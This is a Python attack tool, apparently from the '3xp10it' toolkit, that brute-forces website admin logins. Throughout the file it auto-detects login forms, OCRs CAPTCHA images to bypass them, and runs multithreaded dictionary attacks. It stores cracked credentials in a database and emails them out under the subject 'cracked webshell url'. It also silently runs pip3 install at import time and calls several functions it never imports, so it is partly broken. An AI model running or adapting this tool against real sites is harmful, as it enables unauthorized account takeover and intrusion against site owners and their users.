#############################################################
###  ____         _  __  _ _   
### |__ /_ ___ __/ |/  \(_) |_ 
###  |_ \ \ / '_ \ | () | |  _|
### |___/_\_\ .__/_|\__/|_|\__|
###         |_|                
###                                                          
### name: xadmin.py
### function: 自动识别验证码暴破登录
### date: 2016-11-11
### author: quanyechavshuo
### blog: https://3xp10it.cc
#############################################################
import time
from exp10it import figlet2file
figlet2file("3xp10it",0,True)
time.sleep(1)

import os
import re
import sys
from concurrent import futures
os.system("pip3 install exp10it -U")
from exp10it import CLIOutput
from exp10it import get_user_and_pass_form_from_url
from exp10it import get_yanzhengma_form_and_src_from_url
from exp10it import get_string_from_url_or_picfile
from exp10it import ModulePath
from exp10it import get_remain_time


def crack_admin_login_url(
        url,
        user_dict_file=ModulePath + "dicts/user.txt",
        pass_dict_file=ModulePath + "dicts/pass.txt",
        yanzhengma_len=0):
    # 这里的yanzhengma_len是要求的验证码长度,默认不设置,自动获得,根据不同情况人为设置不同值效果更好
    # 爆破管理员后台登录url,尝试自动识别验证码,如果管理员登录页面没有验证码,加了任意验证码数据也可通过验证
    figlet2file("cracking admin login url", 0, True)
    print("cracking admin login url:%s" % url)
    print("正在使用吃奶的劲爆破登录页面...")

    def crack_admin_login_url_thread(xxx_todo_changeme1):
        (url, username, password) = xxx_todo_changeme1
        if get_flag[0] == 1:
            return
        if has_yanzhengma[0] == False:
            values = {
                '%s' %
                user_form_name: '%s' %
                username,
                '%s' %
                pass_form_name: '%s' %
                password}
        else:
            values = {
                '%s' %
                user_form_name: '%s' %
                username,
                '%s' %
                pass_form_name: '%s' %
                password,
                '%s' %
                yanzhengma_form_name: '%s' %
                yanzhengma}

        try_time[0] += 1
        html = s.post(post_url, values).text
        USERNAME_PASSWORD = "(" + username + ":" + \
            password + ")" + (52 - len(password)) * " "
        # 每100次计算完成任务的平均速度

        left_time = get_remain_time(
            start[0],
            biaoji_time[0],
            remain_time[0],
            100,
            try_time[0],
            sum[0])
        remain_time[0] = left_time
        # print(try_time[0])
        # 这里打印出返回的内容利于判断相关信息
        # print(html)

        sys.stdout.write('-' * (try_time[0] * 100 // sum[0]) + '>' + str(try_time[0] * 100 // sum[0]) +
                         '%' + ' %s/%s  remain time:%s  %s\r' % (try_time[0], sum[0], remain_time[0], USERNAME_PASSWORD))
        sys.stdout.flush()

        if len(html) > logined_least_length:
            # 认为登录成功
            get_flag[0] = 1
            end = time.time()
            CLIOutput().good_print(
                "congratulations!!! admin login url cracked succeed!!!", "red")
            string = "cracked admin login url:%s username and password:(%s:%s)" % (
                url, username, password)
            CLIOutput().good_print(string, "red")
            print("you spend time:" + str(end - start[0]))
            http_domain_value = get_http_domain_from_url(url)
            # 经验证terminate()应该只能结束当前线程,不能达到结束所有线程
            table_name_list = get_target_table_name_list(http_domain_value)
            urls_table_name = http_domain_value.split(
                "/")[-1].replace(".", "_") + "_urls"

            # 在爆破成功时将数据库中相应字段标记,并发送邮件
            # 在非urls表中将cracked_admin_login_urls_info字段添加新的爆破信息
            for each_table in table_name_list:
                auto_write_string_to_sql(
                    string,
                    eval(get_key_value_from_config_file('config.ini', 'default', 'db_name')),
                    each_table,
                    "cracked_admin_login_urls_info",
                    "http_domain",
                    http_domain_value)
            # 将urls表中cracked_admin_login_url_info字段标记为爆破结果信息
            execute_sql_in_db(
                "update %s set cracked_admin_login_url_info='%s' where url='%s'" %
                (urls_table_name, string, url), eval(get_key_value_from_config_file('config.ini', 'default', 'db_name')))
            mail_msg_to(
                string,
                subject="cracked webshell url")
            return {'username': username, 'password': password}

    def crack_admin_login_url_inside_func(url, username, pass_dict_file):
        # urls和usernames是相同内容的列表
        urls = []
        usernames = []
        # passwords是pass_dict_file文件对应的所有密码的集合的列表
        passwords = []
        i = 0
        while 1:
            if os.path.exists(pass_dict_file) is False:
                print("please input your password dict:>", end=' ')
                pass_dict_file = input()
                if os.path.exists(pass_dict_file) is True:
                    break
            else:
                break
        f = open(pass_dict_file, "r+")
        for each in f:
            urls.append(url)
            usernames.append(username)
            each = re.sub(r"(\s)$", "", each)
            passwords.append(each)
            i += 1
        f.close()
        sum[0] = usernames_num * i

        with futures.ThreadPoolExecutor(max_workers=20) as executor:
            executor.map(crack_admin_login_url_thread, list(zip(urls, usernames, passwords)))

    get_result = get_user_and_pass_form_from_url(url)
    user_form_name = get_result['user_form_name']
    pass_form_name = get_result['pass_form_name']
    # print(user_form_name)
    # print(pass_form_name)
    # input()
    form_action_url = get_result['form_action_url']
    post_url = url[:-len(url.split("/")[-1])] + form_action_url
    if user_form_name is None:
        print("user_form_name is None")
        return
    if pass_form_name is None:
        print("pass_form_name is None")
        return
    unlogin_length = len(get_result['response_key_value']['content'])
    # 如果post数据后返回数据长度超过未登录时的0.5倍则认为是登录成功
    logined_least_length = unlogin_length + unlogin_length / 2
    get_flag = [0]
    try_time = [0]
    sum = [0]
    start = [0]

    # 用来标记当前时间的"相对函数全局"变量
    biaoji_time = [0]
    # 用来标记当前剩余完成时间的"相对函数全局"变量
    tmp = time.time()
    remain_time = [tmp - tmp]
    # current_username_password={}

    has_yanzhengma = [False]
    find_yanzhengma = get_yanzhengma_form_and_src_from_url(url)
    # print("现在打印是否找到了验证码表单")
    # print(find_yanzhengma)
    # input()
    if find_yanzhengma:
        yanzhengma_form_name = find_yanzhengma['yanzhengma_form_name']
        yanzhengma_src = find_yanzhengma['yanzhengma_src']
        has_yanzhengma = [True]

        while 1:
            # 下面获取一次验证码,只获取一次就好了

            # 这里不用exp10it模块中打包好的get_request和post_request来发送request请求,因为要保留session在服务器需要
            #yanzhengma = get_string_from_url_or_picfile(yanzhengma_src)
            import requests
            s = requests.session()
            import shutil
            response = s.get(yanzhengma_src, stream=True)
            with open('img.png', 'wb') as out_file:
                shutil.copyfileobj(response.raw, out_file)
            del response
            yanzhengma = get_string_from_url_or_picfile("img.png")
            os.system("rm img.png")

            time.sleep(3)
            if re.search(r"[^a-zA-Z0-9]+", yanzhengma):
                # time.sleep(3)
                continue
            elif re.search(r"\s", yanzhengma):
                continue
            elif yanzhengma == "":
                continue
            else:
                if yanzhengma_len != 0:
                    if len(yanzhengma) != yanzhengma_len:
                        continue
                # print(yanzhengma)
                # print(len(yanzhengma))
                break

    with open(r"%s" % user_dict_file, "r+") as user_file:
        all_users = user_file.readlines()
        usernames_num = len(all_users)
        start[0] = time.time()
        for username in all_users:
            # 曾经双层多线程,没能跑完所有的组合,于是不再这里再开多线程
            username = re.sub(r'(\s)$', '', username)
            crack_admin_login_url_inside_func(url, username, pass_dict_file)

    return get_flag[0]
if __name__ == '__main__':
    url = sys.argv[1]
    # 下面加4是因为http://localhost/admin.php中验证码为4,在不确定验证码长度情况下下面第二个参数不用写
    # crack_admin_login_url(url,yanzhengma_len=4)
    crack_admin_login_url(url)

